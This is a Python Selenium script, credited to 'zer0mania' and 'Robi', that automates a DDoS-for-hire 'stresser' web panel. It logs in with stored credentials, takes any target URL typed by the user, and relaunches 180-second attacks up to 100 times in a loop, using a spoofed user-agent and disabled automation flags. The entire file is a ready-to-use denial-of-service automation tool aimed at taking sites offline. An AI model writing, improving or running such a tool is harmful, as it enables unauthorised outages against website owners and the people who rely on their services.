# stresse.app-auto: Down sites with https://stresse.app/ with almost no limit.

from os import system
import platform
import time
import pyfiglet
import json
from json import dumps
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.service import Service

chrome_options = Options()
# uncomment for it to run headless
#chrome_options.add_argument('--headless')
chrome_options.add_argument('--no-sandbox')
chrome_options.add_argument("user-agent=Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0")
chrome_options.add_experimental_option("excludeSwitches", ["enable-automation", "enable-logging"])
chrome_options.add_experimental_option('useAutomationExtension', False)

driver = webdriver.Chrome(options=chrome_options)

data = {}

with open('login.json') as f:
    data = json.load(f)
username = data['username']
password = data['password']

url = "https://stresse.app/login"
panel = "https://stresse.app/panel"

os = platform.system()

if os == "Windows":
    system("cls")
    system("color 4")
    system("title stresser.app-auto")

text = pyfiglet.Figlet()
print(text.renderText('STRESSER AUTO'))

print('[|]-------------------------------------------------------------------[|]')

print("[!] Made by zer0mania#4652 fixxed by Robi")

print("[!] Intializing...")

# Opening the website

driver.get(url)

# Login

driver.find_element(By.XPATH, "//input[@placeholder='Username']").send_keys(username)

driver.find_element(By.XPATH, "//input[@placeholder='Password']").send_keys(password)

driver.find_element(By.XPATH, "//button[@class='btn btn-primary btn-block px-4']").click()

# token invalid relogin patch

time.sleep(3)

driver.get(url)

driver.find_element(By.XPATH, "//input[@placeholder='Username']").send_keys(username)

driver.find_element(By.XPATH, "//input[@placeholder='Password']").send_keys(password)

driver.find_element(By.XPATH, "//button[@class='btn btn-primary btn-block px-4']").click()

print("[+] Logged In. Proceeding to panel.")

time.sleep(1)

# Goto Panel

driver.get(panel)

print("[+] Idle at panel.")

targeturl = input("[?] Enter URL to stress: ")

driver.find_element(By.XPATH, "/html/body/div/div[1]/div[3]/div/div[2]/div/div[1]/div/div[3]/div/div/div[1]/div[2]/div/div/input").send_keys(targeturl)

driver.find_element(By.XPATH, "/html/body/div/div[1]/div[3]/div/div[2]/div/div[1]/div/div[3]/div/div/div[1]/div[3]/div/input").send_keys("180")

print("[!] Starting attack on" + " " + targeturl)

# Loop to reattack

i = 1
while i <= 100:
  driver.find_element(By.XPATH, "/html/body/div/div[1]/div[3]/div/div[2]/div/div[1]/div/div[3]/div/div/div[2]/button[1]").click()
  time.sleep(181)
  print("[!] 180 seconds is up, restarting attack.")
  i += 1
